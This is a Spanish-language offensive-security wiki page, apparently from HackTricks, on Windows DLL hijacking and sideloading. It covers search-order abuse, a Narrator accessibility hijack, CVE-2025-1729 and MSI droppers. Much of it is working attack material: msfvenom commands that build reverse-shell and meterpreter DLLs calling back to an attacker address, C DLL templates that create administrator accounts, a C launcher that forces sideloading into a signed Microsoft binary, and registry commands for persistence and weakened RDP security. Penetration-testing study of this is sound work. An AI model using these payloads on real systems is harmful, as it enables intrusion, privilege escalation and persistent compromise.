# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación confiable para que cargue un DLL malicioso. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se usa principalmente para la ejecución de código, lograr persistencia y, con menos frecuencia, privilege escalation. A pesar del enfoque en la escalada aquí, el método de hijacking permanece consistente entre objetivos.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Reemplazar un DLL genuino por uno malicioso, opcionalmente usando DLL Proxying para preservar la funcionalidad del DLL original.
2. **DLL Search Order Hijacking**: Colocar el DLL malicioso en una ruta de búsqueda antes que el legítimo, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear un DLL malicioso que la aplicación cargue creyendo que es un DLL requerido inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o los archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación al DLL malicioso.
5. **WinSxS DLL Replacement**: Sustituir el DLL legítimo por uno malicioso en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar el DLL malicioso en un directorio controlado por el usuario junto con la aplicación copiada, parecido a las técnicas de Binary Proxy Execution.

> [!TIP]
> Para una cadena paso a paso que apila HTML staging, AES-CTR configs y .NET implants encima de DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrar Dlls faltantes

La forma más común de encontrar Dlls faltantes en un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y simplemente mostrar la **File System Activity**:

![](<../../../images/image (153).png>)

Si buscas **dlls faltantes en general** deja esto ejecutándose por unos **segundos**.\
Si buscas un **dll faltante dentro de un ejecutable específico** deberías establecer **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un dll que un proceso con privilegios intentará cargar** en alguno de los **lugares donde se va a buscar**. Por lo tanto, podremos **escribir** un dll en una **carpeta** donde el **dll se busca antes** que en la carpeta donde está el **dll original** (caso raro), o podremos **escribir en alguna carpeta donde se va a buscar el dll** y el **dll original no existe** en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan los Dlls específicamente.**

Las **aplicaciones Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia particular. El problema de DLL hijacking surge cuando un DLL malicioso se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que el DLL auténtico. Una solución para prevenir esto es asegurar que la aplicación use rutas absolutas cuando se refiera a los DLLs que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** abajo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende a la segunda posición. Para deshabilitar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) es llamada con **LOAD_WITH_ALTERED_SEARCH_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **un dll podría cargarse indicando la ruta absoluta en lugar solo del nombre**. En ese caso ese dll **solo se buscará en esa ruta** (si el dll tiene dependencias, estas se buscarán como si se hubieran cargado por nombre).

Hay otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir determinísticamente en la ruta de búsqueda de DLLs de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al suministrar un directorio controlado por el atacante aquí, un proceso objetivo que resuelva un DLL importado por nombre (sin ruta absoluta y sin usar las banderas de carga segura) puede verse forzado a cargar un DLL malicioso desde ese directorio.

Idea clave
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde vive tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva un DLL por nombre, el loader consultará este DllPath suministrado durante la resolución, permitiendo sideloading fiable incluso cuando el DLL malicioso no está colocalizado con el EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que afecta solo al proceso actual.
- El objetivo debe importar o llamar a LoadLibrary a un DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas hardcodeadas no pueden ser hijackeadas. Forwarded exports y SxS pueden cambiar la precedencia.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Lanza un binario firmado conocido por buscar xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación vía el DllPath suministrado y sideloads tu DLL.

Esta técnica se ha observado in-the-wild para impulsar cadenas de sideloading multi-etapa: un launcher inicial deja un helper DLL, que luego spawn a Microsoft-signed, hijackable binary con un DllPath personalizado para forzar la carga del DLL del atacante desde un staging directory.


#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y un manifiesto antes de usar por defecto la DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos en que la DLL es reconocida como una **known DLL** para la versión de Windows actual, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si hubieran sido indicadas únicamente por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalando privilegios

**Requisitos**:

- Identifica un proceso que opere o vaya a operar bajo **diferentes privilegios** (horizontal or lateral movement), que **carezca de una DLL**.
- Asegúrate de que haya **acceso de escritura** disponible para cualquier **directorio** en el que se **buscará** la **DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro del system path.

Sí, los requisitos son complicados de encontrar ya que **por defecto es extraño encontrar un ejecutable privilegiado que le falte una dll** y es aún **más extraño tener permisos de escritura en una carpeta del system path** (por defecto no puedes). Pero, en entornos mal configurados esto es posible.\
Si tienes suerte y cumples los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es bypass UAC**, puede que encuentres ahí un **PoC** de un Dll hijaking para la versión de Windows que puedas usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un executable y los exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar Dll Hijacking para escalar privilegios** con permisos para escribir en una **carpeta en System Path** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)comprobará si tienes permisos de escritura en cualquier carpeta dentro de system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. Ten en cuenta que Dll Hijacking resulta útil para [escalar desde el nivel de integridad Medium a High **(eludiendo UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** en este estudio de dll hijacking centrado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que pueden ser útiles como **plantillas** o para crear una **dll que exporte funciones no requeridas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso cuando se carga**, pero también de **exponerse** y **funcionar** como **se espera**, reenviando todas las llamadas a la librería real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes indicar **un ejecutable y seleccionar la librería** que quieres proxificar y **generar una dll proxificada** o **indicar la Dll** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos el Dll que compilas debe **export several functions** que serán cargadas por el victim process; si estas functions no existen, el **binary won't be able to load** them y el **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accesibilidad/ATs)

Windows Narrator.exe sigue comprobando una DLL de localización predecible y específica por idioma al iniciarse que puede ser hijacked para arbitrary code execution y persistence.

Datos clave
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Descubrimiento con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silencio
- Un hijack ingenuo hará que hable/resalte la UI. Para mantener silencio, al adjuntarse enumere los hilos de Narrator, abra el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y `SuspendThread` dicho hilo; continúe en su propio hilo. Vea el PoC para el código completo.

Activación y persistencia mediante la configuración de Accessibility
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, iniciar Narrator carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), presione CTRL+WIN+ENTER para iniciar Narrator.

Ejecución como SYSTEM vía RDP (movimiento lateral)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- La ejecución se detiene cuando la sesión RDP se cierra—inyeccione/migre rápidamente.

Bring Your Own Accessibility (BYOA)
- Puede clonar una entrada de registro de un Accessibility Tool (AT) integrado (p. ej., CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` a ese nombre de AT. Esto actúa como proxy para la ejecución arbitraria dentro del framework de Accessibility.

Notas
- Escribir en `%windir%\System32` y cambiar valores en HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Estudio de caso: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), registrado como **CVE-2025-1729**.

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario conectado.
- **Permisos del directorio**: Es escribible por `CREATOR OWNER`, permitiendo a usuarios locales colocar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, indicando precedencia de búsqueda en el directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr ejecución de código en el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo del ataque

1. Como usuario estándar, colocar `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Esperar a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si un administrador está conectado cuando la tarea se ejecuta, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadenar técnicas estándar de bypass de UAC para elevar de integridad media a privilegios SYSTEM.

## Estudio de caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Los actores de amenazas con frecuencia emparejan droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.

Chain overview
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación GUI (por ejemplo, LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa desde recursos embebidos.
- El dropper escribe un EXE legítimo y firmado y una DLL maliciosa en el mismo directorio (par ejemplo: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLLs de Windows carga wsc.dll desde el directorio de trabajo primero, ejecutando código del atacante bajo un padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Buscar entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo embebido en segundo plano.
- En Orca (Microsoft Orca.exe), inspeccionar las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads embebidos/divididos en el CAB del MSI:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Buscar múltiples fragmentos pequeños que son concatenados y descifrados por una VBScript CustomAction. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: attacker DLL. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye un proxy DLL y reenvía los exports requeridos a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Construye un payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para los requisitos de exportación, utiliza un framework de proxy (p. ej., DLLirant/Spartacus) para generar un DLL de reenvío que también ejecute tu payload.

- Esta técnica depende de la resolución de nombres de DLL por el binario host. Si el host usa rutas absolutas o flags de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y exportaciones reenviadas pueden influir en la precedencia y deben considerarse al seleccionar el binario host y el conjunto de exportaciones.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
